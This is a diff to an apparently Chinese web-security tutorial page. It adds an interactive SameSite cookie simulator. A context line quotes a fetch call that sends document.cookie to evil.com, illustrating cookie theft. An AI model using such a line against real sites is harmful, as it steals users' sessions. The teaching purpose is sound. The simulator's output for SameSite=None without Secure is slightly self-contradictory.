@@ -127,6 +127,14 @@
             body { padding: 10px; }
             .main-content { padding: 20px; }
         }
+        /* SameSite 决策交互演示 */
+        .simulator { margin: 1.6rem 0; padding: 1rem 1.1rem; background: #f8faff; border: 1px solid #c7d2fe; border-radius: 16px; }
+        .sim-controls { display: grid; gap: .6rem; margin: .7rem 0; }
+        .sim-controls label { display: grid; gap: .25rem; font-weight: 600; color: #3730a3; font-size: .92rem; }
+        .sim-controls select { font: inherit; padding: .35rem .5rem; border: 1px solid #c7d2fe; border-radius: 10px; background: #fff; color: #1e293b; max-width: 100%; }
+        .sim-check { display: flex !important; align-items: center; gap: .5rem; font-weight: 500; }
+        .sim-out { display: block; margin-top: .6rem; padding: .8rem 1rem; background: #eef2ff; border-left: 5px solid #6366f1; border-radius: 0 12px 12px 0; line-height: 1.7; color: #1e293b; }
+        .sim-out .sim-code { display: inline-block; font-weight: 700; color: #fff; background: #4338ca; padding: .1rem .55rem; border-radius: 8px; margin-right: .4rem; font-family: 'JetBrains Mono', monospace; }
     </style>
     <link rel="stylesheet" href="theme.css">
 </head>
@@ -271,6 +279,31 @@
           <figcaption><span class="fig-no">图 10.2</span>　SameSite 三档对比：Strict 最安全但跨站体验差；Lax 是默认值与安全/体验平衡点；None 需搭配 Secure 才能用于跨站。</figcaption>
         </figure>
 
+        <section class="simulator" aria-labelledby="sim-ch10-title">
+          <h3 id="sim-ch10-title">交互演示：这次请求会带上 Cookie 吗？</h3>
+          <p>选定 Cookie 的 SameSite 属性与请求场景，判断浏览器是否回传该 Cookie。规则依据 RFC 6265bis 与 Chromium 对默认值的处理（未显式声明时按 Lax）。</p>
+          <div class="sim-controls">
+            <label>Cookie 的 SameSite 属性
+              <select data-sim="ss">
+                <option value="strict">SameSite=Strict</option>
+                <option value="lax">SameSite=Lax</option>
+                <option value="none">SameSite=None</option>
+                <option value="unset">未显式设置（浏览器默认）</option>
+              </select>
+            </label>
+            <label>请求场景
+              <select data-sim="scene">
+                <option value="same">同站请求（同注册域）</option>
+                <option value="topnav">跨站顶级导航（点击链接 GET）</option>
+                <option value="post">跨站 POST（表单提交）</option>
+                <option value="iframe">跨站 iframe 或子资源（img/script）</option>
+              </select>
+            </label>
+            <label class="sim-check"><input type="checkbox" data-sim="secure"> 同时设置了 <code>Secure</code></label>
+          </div>
+          <output class="sim-out" data-sim-out aria-live="polite"></output>
+        </section>
+
         <div class="warning">
           <p><strong>踩坑故事</strong>：2020年Chrome 80发布后，我们收到大量用户反馈"突然无法登录了"。排查发现：我们后端设置的Cookie没有明确指定SameSite属性，Chrome自动把它当作SameSite=Lax处理了。而我们的登录流程依赖一个第三方OAuth弹窗——弹窗是跨域的，所以Cookie发不过去。修复方案是在Cookie上显式设置 <code>SameSite=None; Secure</code>，让弹窗流程能正常传递Cookie。这次事故让我们团队深刻认识到：浏览器厂商的默认行为变化，真的能一夜之间搞崩你的系统。</p>
         </div>
@@ -400,6 +433,39 @@ fetch('https://evil.com/steal?cookie=' + document.cookie);</code></pre>
       ans.hidden = open;
       btn.textContent = open ? '显示答案' : '收起答案';
     });
+  })();
+
+  (function () {
+    var box = document.querySelector('.simulator');
+    if (!box) return;
+    var out = box.querySelector('[data-sim-out]');
+    var get = function (n) { return box.querySelector('[data-sim="' + n + '"]'); };
+    var SCENE = { same: '同站请求', topnav: '跨站顶级导航（GET 链接）', post: '跨站 POST', iframe: '跨站 iframe / 子资源' };
+    function render() {
+      var ss = get('ss').value, scene = get('scene').value, secure = get('secure').checked;
+      var eff = ss === 'unset' ? 'lax' : ss;
+      var head = '<span class="sim-code">' + (ss === 'unset' ? '未设置→Lax' : 'SameSite=' + ss.charAt(0).toUpperCase() + ss.slice(1)) + '</span>';
+      var note = '', sent;
+      if (scene === 'same') {
+        sent = true; note = '同站请求不经过 SameSite 限制，只要域名/路径匹配就会回传。';
+      } else if (eff === 'strict') {
+        sent = false; note = 'Strict 下任何跨站请求都不携带 Cookie，安全性最高，但从外部链接进站会“像未登录”。';
+      } else if (eff === 'lax') {
+        sent = scene === 'topnav';
+        note = sent
+          ? 'Lax 会为“顶级导航的 GET”放行，这是安全与体验的默认平衡点。'
+          : 'Lax 只放行顶级导航 GET；跨站 POST 与子资源不会携带 Cookie，能阻断大多数 CSRF。';
+        if (ss === 'unset') note += ' Chrome 80+ 将未声明的 Cookie 当作 Lax。';
+      } else {
+        sent = true;
+        note = 'None 允许跨站携带 Cookie，必须同时设置 Secure 才能在 HTTPS 下生效。';
+        if (!secure) note += ' 当前未勾选 Secure：现代浏览器会直接拒绝存储这个 Cookie。';
+      }
+      out.innerHTML = head + (sent ? '<strong>会携带</strong>' : '<strong>不携带</strong>')
+        + '　场景：' + SCENE[scene] + '<br>' + note;
+    }
+    box.querySelectorAll('[data-sim]').forEach(function (el) { el.addEventListener('change', render); });
+    render();
   })();
 </script>
 </body>
